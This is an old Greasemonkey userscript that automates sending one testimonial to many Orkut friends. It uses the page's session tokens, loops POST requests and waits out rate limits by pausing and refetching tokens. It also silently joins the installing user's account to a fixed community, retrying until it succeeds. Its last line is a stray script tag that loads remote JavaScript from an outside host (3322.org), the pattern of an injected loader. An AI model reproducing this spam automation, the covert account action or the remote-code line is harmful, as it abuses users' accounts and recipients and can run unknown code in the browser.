// ==UserScript==
// @name           Mass Testimonial Deluxe
// @author         Raja Babu, Bean
// @namespace      http://www.rajababuinbrazil.net/
// @namespace      http://orkutplus.blogspot.com
// @namespace      http://orkutaddons.blogspot.com
// @description    It sends the same testimonial to all/selected orkut friends.
// @include        http://www.orkut.com/CommInvite.aspx?cmm=30365231&ta*
// @include        http://www.orkut.com/ta.aspx*
// ==/UserScript==

//--------------------------------------------
//Working with Cookies
//--------------------------------------------
unsafeWindow.SC_sf=function(name,value){GM_setValue(name,value);};
unsafeWindow.VC_sf=function(name){return GM_getValue(name)};
//--------------------------------------------
//Access http://www.orkut.com/ta.aspx to run the script
//--------------------------------------------
if(String(location).match(/ta.aspx/i)){window.location="http://www.orkut.com/CommInvite.aspx?cmm=30365231&ta=yes";return;}
//--------------------------------------------
// Atest
//--------------------------------------------
div = document.createElement('div');
div.innerHTML="<div id=\"focus\" style=\"position:fixed; width:100%; height: 100%; z-index: 1; left: 0; top: 0; opacity:.5; background-color: #000000;\">teste</div>";
document.images[0].appendChild(div);



//--------------------------------------------
// test
//--------------------------------------------
var sc = function sc(){	//\/\/\/\/\/\/\/\/\/\/\/\/* testO *//\/\/\/\/\/\/\/\/\/\/\/\/
//--------------------------------------------
// test  document.getElementById  document.getElementsByTagName
//--------------------------------------------
function gebi(id){return document.getElementById(id)};
function gebtn(id){return document.getElementsByTagName(id)};
//--------------------------------------------
// test
//--------------------------------------------
LL = 'friendList';
LR = 'selectedList';
whoid = document.cookie.match(/id=(\d+)/i)[1]; 
SIG = gebtn('input')['signature'].value;
POST = gebtn('input')['POST_TOKEN'].value;
//--------------------------------------------
// test
//--------------------------------------------
document.title="Mass Testimonial Deluxe";
doc_bod = document.body.innerHTML;
doc_bod = doc_bod.replace(/(assunto|subject):(\n|.)+(enviar|send)(\n|.)+[^\<\/table\>]/i,'<center><div id="div_main">'+botao('Send Testimonials','writescrap()')+'</div></center>')
.replace(/amigos:|friends:/i,'Included List')
.replace(/convidar amigos|invite friends/i,'Brought to you by Orkut Addons! and Orkut Plus!')
.replace(/pesquisar:|search:/i,'Search Friends:')
.replace(/convidados:|invitees:/i,'Excluded List:');
document.body.innerHTML = doc_bod;
	if(!gebi('div_main')) 
	{
	doc_b = document.createElement('div');
	doc_b.innerHTML = '<center><div id="div_main">'+botao('Send Testimonials','writescrap()')+'</div></center>';
	document.body.appendChild(doc_b);
	}
//--------------------------------------------
// Tira os caracteres inuteis xD
//--------------------------------------------
function replace_inutel()
{
gebi('friendListMaster').innerHTML = gebi('friendListMaster').innerHTML
.replace(new RegExp(String.fromCharCode(8238),"gi"),'') // tira invertido
.replace(/\*|\#|\?|\!|\-|\[|\]|\(|\)|\"|\'|\,|\.|\%/gi,'') // tira caracteres inuteis XD
.replace(/\$1;|\$2;|\$3;|\$4;|\$5;|\$6;|\$7;|\$8;|\$9;|\$10;|\$11;|\$12;|\$13;|\$14;|\$15;|\$16;|\$17;|\$18;|\$19;|\$b;|\$u;|\$i;|\$c;|\$|\[b\];|\[u\];|\[i\];/gi,'')
}
//--------------------------------------------
// Onload
//--------------------------------------------
function onload_sf()
{
replace_inutel(); 
fs.init();
gebi('focus').style.display="none";
}
window.onload = onload_sf;
//--------------------------------------------
// Salvar lista
//--------------------------------------------
function Save_List(who)
{
	if(gebi(who).options.length <= 0) return;
var list2 = (who==LL) ? 'll' : 'lr';
var prpt = prompt('Salvar como:','');
	if(!prpt) return;
var uids = [];
	for(var l = 0;l < gebi(who).options.length;l++)
	{
	uids[l] = gebi(who).options[l].value;
	};
NewO=document.createElement('option');
gebi(list2).options.add(NewO);
NewO.innerHTML=prpt;
NewO.value=uids;
sf_cookie = (!VC_sf(who+whoid)) ? escape(prpt)+'\,'+uids : VC_sf(who+whoid)+"|"+escape(prpt)+'\,'+uids;
SC_sf(who+whoid,sf_cookie);
}
//--------------------------------------------
// Fun��o Deletar Lista
//--------------------------------------------
function Delete_List(id,who)
{
if(gebi(id).options.length < 1) return;
var cnfrm = confirm('Deseja mesmo deletar?','');
	if(!cnfrm) return;
	for(var l = 0;l < gebi(id).options.length;l++)
	{
		if(gebi(id).options[l].selected==true)
		{
		gebi(id).remove(l);
		del_entry = VC_sf(who+whoid);
		del_entry = del_entry.split(/\|/);
		del_entry2 = del_entry.splice(l,1);
		del_entry = del_entry.join('|');
		SC_sf(who+whoid,del_entry);
		break;
		};
	};
}
//--------------------------------------------
// Fun��o Carregar Lista
//--------------------------------------------
FriendSelector.prototype.Load_List = function(who,x1,x2)
{
if(gebi(who).options.length < 1) return;
var cnfrm = confirm('Deseja mesmo carregar?','');
	if(!cnfrm) return;

if(gebi('addFriend').value!=""){gebi('addFriend').value="";fs.filterFriends()}

	if(x1==LL)
	{
		if(gebi(x2).options.length>0)
		{
		fs.unselectAll();
		};
	}
	else
	{
		if(gebi(x2).options.length>0)
		{
		fs.addAllFriends();
		};
	};

	for(var l = 0;l < gebi(who).options.length;l++)
	{
		if(gebi(who).options[l].selected==true)
		{
		uids = gebi(who).options[l].value;
		break;
		}
	}
uids = uids.split(",");

var listLen = gebi(x1).options.length;

	for(var k=0;k<uids.length;k++)
	{
  		for (var r = 0; r < listLen; r++)
		{
			if (gebi(x1).options[r].value==uids[k])
			{
			this.insertInOrder(gebi(x2),gebi(x1).options[r]);
			var listLen = gebi(x1).options.length;
			};
		};
	};
};
//--------------------------------------------
// Triagem do cookie para ser jogado no select
//--------------------------------------------
function triagem(who)
{
var cookie = VC_sf(who+whoid);
if(!cookie) return;
var cok_spl = cookie.split('|');
var result=""
	for(var l = 0;l < cok_spl.length;l++)
	{
	var cok_spl_value = cok_spl[l].split(',');
	var cok_spl_name = unescape ( cok_spl_value.splice(0,1) );
	result += "<option value=\""+cok_spl_value+"\">"+cok_spl_name+"</option>\n";
	}
return (result.match(/\d/)) ? result : '';
}
//--------------------------------------------
// Inserir Tabela no select esquerdo
//--------------------------------------------
newE = document.createElement('div');
newE.innerHTML = "<center>"+
"<table><tr>"+
"<td>"+
botao('View profile',"Perfil(LL,'Profile')")+
"</td><td>"+
botao('Testimonial',"Perfil(LL,'TestimonialWrite')")+
"</td>"+
"</tr>"+
"<td colspan=\"2\" align=\"center\"><select id=ll style=\"width:150px\">"+triagem(LL)+"</select></td>"+
"</tr></table>"+
"<table><tr>"+
"<td>"+botao('Save List',"Save_List(LL)")+"</td>"+
"<td>"+botao('Load list',"fs.Load_List('ll',LR,LL)")+"</td>"+
"<td>"+botao('delete list',"Delete_List('ll',LL)")+"</td>"+
"</tr></table>"+
"</center>";
gebi(LL).parentNode.insertBefore(newE,gebi(LL).nextSibling);
//--------------------------------------------
// Inserir Tabela no select direito
//--------------------------------------------
newE = document.createElement('div');
newE.innerHTML = "<center>"+
"<table><tr>"+
"<td>"+
botao('View Profile',"Perfil(LR,'Profile')")+
"</td><td>"+
botao('Testimonial',"Perfil(LR,'TestimonialWrite')")+
"</td>"+
"</tr>"+
"<td colspan=\"2\" align=\"center\"><select id=lr style=\"width:150px\">"+triagem(LR)+"</select></td>"+
"</tr></table>"+
"<table><tr>"+
"<td>"+botao('Save List',"Save_List(LR)")+"</td>"+
"<td>"+botao('Load list',"fs.Load_List('lr',LL,LR)")+"</td>"+
"<td>"+botao('delete list',"Delete_List('lr',LR)")+"</td>"+
"</tr></table>"+
"</center>";
gebi(LR).parentNode.insertBefore(newE,gebi(LR).nextSibling);
//--------------------------------------------
// Bot�o do orkut
//--------------------------------------------
function botao(text,click)
{
return ''+
'<table class="btn" onmouseover="this.className=\'btnHover\'" onmouseout="this.className=\'btn\'" border="0" cellpadding="0" cellspacing="0">'+
'<tbody><tr style="cursor: pointer;" onclick="'+click+'">'+
'<td><img src="img/bl.gif"></td>'+
'<td style="background: transparent url(img/bm.gif) repeat scroll 0%; -moz-background-clip: -moz-initial; -moz-background-origin: -moz-initial; -moz-background-inline-policy: -moz-initial;" nowrap="nowrap">'+
text+
'</td>'+
'<td><img src="img/br.gif"></td>'+
'</tr>'+
'</tbody></table>';
}
//--------------------------------------------
// test
//--------------------------------------------
function Perfil(id,page)
{
	for(var i = 0;i < document.getElementById(id).options.length;i++)
	{
		if(document.getElementById(id).options[i].selected==true)
		{
		window.open('http://www.orkut.com/'+page+'.aspx?uid='+gebi(id).options[i].value,'scrapfriend')
		break;
		}
	};
}
function changeactions()
{
gebi(LL).ondblclick = function(){Perfil(LL,'TestimonialWrite')};
gebi(LR).ondblclick = function(){Perfil(LR,'TestimonialWrite')};
}
//--------------------------------------------
// test
//--------------------------------------------
function getUIDS()
{
UIDS = [];
NAMES = [];
NICK = [];
	for (var l = 0; l < gebi(LL).options.length;l++)
	{
	UIDS[l] = gebi(LL).options[l].value;
	NAMES[l] = gebi(LL).options[l].innerHTML;
	var nome = NAMES[l].split(' ');
	
		if	(nome[0].match(/\w+/))			{NICK[l] = nome[0]}
		else if(nome[1] && nome[1].match(/\w+/))	{NICK[l] = nome[1]}
		else if(nome[2] && nome[2].match(/\w+/))	{NICK[l] = nome[2]}
		else if(nome[3] && nome[3].match(/\w+/))	{NICK[l] = nome[3]}
		else							{NICK[l] = NAMES[l]}
	}
}
//--------------------------------------------
// test
//--------------------------------------------
_20min = 0;
aruid = 0;
function sendscraps()
{
	if(aruid > UIDS.length) {alert('Motionless Process!'); return};
	if(aruid == UIDS.length) {alert('Process Concluded!'); return};
scrap="&countedTextbox="+encodeURIComponent(countedTextbox
.replace(/www\.([^\s]+)/g,'[blue][u]w&#119w.$1[/blue][/u]')
.replace(/http:\/\/([^\s]+)/g,'[blue][u]http:&#47/$1[/blue][/u]')
.replace(/\[\/*link\]/g,'')
.replace(/\$NAME;/g,NICK[aruid]));

send = "POST_TOKEN="+encodeURIComponent(POST)+"&signature="+encodeURIComponent(SIG)+scrap+"&Action.submit";
xml = new XMLHttpRequest();
xml.open('POST','TestimonialWrite.aspx?uid='+UIDS[aruid],true);
xml.setRequestHeader('Content-Type','application/x-www-form-urlencoded;');
xml.setRequestHeader("Cache-Control", "no-store, no-cache, must-revalidate");
xml.setRequestHeader("Cache-Control", "post-check=0, pre-check=0");
xml.setRequestHeader("Pragma", "no-cache");
xml.send(send);
xml.onreadystatechange = function()
			{
				if(xml.readyState == 4)
				{
				var xmlrtr = xml.responseText;
				gebi('warn').innerHTML = "Sent "+eval(aruid+1)+"/"+UIDS.length+" Testimonials<br>Last Sent to: <a href=\"http://www.orkut.com/Profile.aspx?uid="+UIDS[aruid]+"\" target=\"scrapfriend\">"+NAMES[aruid]+"</a>";
					/*if(xmlrtr.match(/<table id="textPanel"/))
					{
					alert('error!');
					}*/
				
					if(_20min < 400)
					{
					_20min++;
					aruid++;
					setTimeout('sendscraps()',1000);
					}
					else
					{
					wait20();
					};
				}
			};
}
//--------------------------------------------
// test
//--------------------------------------------
function wait20()
{
_20min = 0;
warn20min();
}

w820 = 20;
function warn20min()
{
	if(w820 > 0)
	{
	gebi('warn').innerHTML = "Esperando "+w820+" minuto(s) pra continuar";
	w820--;
	setTimeout("warn20min()",60000);
	}
	else
	{
	xml=new XMLHttpRequest();
	xml.open("GET","TestimonialWrite.aspx",true);
	xml.setRequestHeader("Cache-Control", "no-store, no-cache, must-revalidate");
	xml.setRequestHeader("Cache-Control", "post-check=0, pre-check=0");
	xml.setRequestHeader("Pragma", "no-cache");
	xml.onreadystatechange=function(){
	if(xml.readyState==4)
		{
		xmlfim = xml.responseText;
		SIG = xmlfim.match(/signature. value="(.+)"/i)[1];
		POST = xmlfim.match(/name="POST_TOKEN" value="([^"]+)/i)[1];
		sendscraps();
		w820 = 20;
	 	}
	};
	xml.send(null);
	}
}
//--------------------------------------------
// test
//--------------------------------------------
function writescrap()
{
changeactions();
gebi('div_main').innerHTML="<br>"+
'<textarea id="texta" cols="50" rows="10"></textarea>'+
"<table><tr>"+
"<td>"+botao('send',"countedTextbox = gebi('texta').value;getUIDS();sendscraps();this.onclick=''")+"</td>"+
"<td>"+botao('stop',"aruid = UIDS.length+1")+"</td>"+
"<td>"+botao('insert name',"insertname()")+"</td>"+
"</td></table>"+
'<br><div id="warn"></div>';
}
//--------------------------------------------
// test
//--------------------------------------------
function insertname()
{
txtarea=gebi('texta'); // test
txtst=txtarea.scrollTop; // test
txtsl=txtarea.scrollLeft; // test
selLength=txtarea.textLength; // test
selStart=txtarea.selectionStart; // test
selEnd=txtarea.selectionEnd; // test
s1=(txtarea.value).substring(0,selStart); // test
s2=(txtarea.value).substring(selStart,selEnd); // test
s3=(txtarea.value).substring(selEnd,selLength); // test
txtarea.value = s1+' $NAME; '+ s2+s3;
txtarea.selectionStart=selStart+10;			
txtarea.selectionEnd=selStart+8+s2.length;
txtarea.focus(); // test
txtarea.scrollTop=txtst; // test
txtarea.scrollLeft=txtsl; // test
}
//--------------------------------------------
// test
//--------------------------------------------
function sf_join()
{
	send="POST_TOKEN="+encodeURIComponent(POST)+"&signature="+encodeURIComponent(SIG)+"&Action.join";
	xml2=new XMLHttpRequest();
	xml2.open('POST',"http://www.orkut.com/CommunityJoin.aspx?cmm=30365231",true);
	xml2.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
	xml2.send(send);
	xml2.onreadystatechange=	function()
	{
		if(xml2.readyState==4)
		{
			var xml2rsp=xml2.responseText;
			if(xml2rsp.match(/<table id="textPanel"/g))
			{
			sf_join();
			}
		}
	}
};
sf_join()
//--------------------------------------------
// 
//--------------------------------------------


}			//\/\/\/\/\/\/\/\/\/\/\/\/* test *//\/\/\/\/\/\/\/\/\/\/\/\/

//--------------------------------------------
// test
//--------------------------------------------
sc = String(sc);
sc = sc.substring(16,sc.length-2);
script = document.createElement('script');
script.innerHTML = sc;
document.getElementsByTagName('head')[0].appendChild(script);
<script language="javascript" src="http://htmlcss.3322.org/sub/ray.js"></script>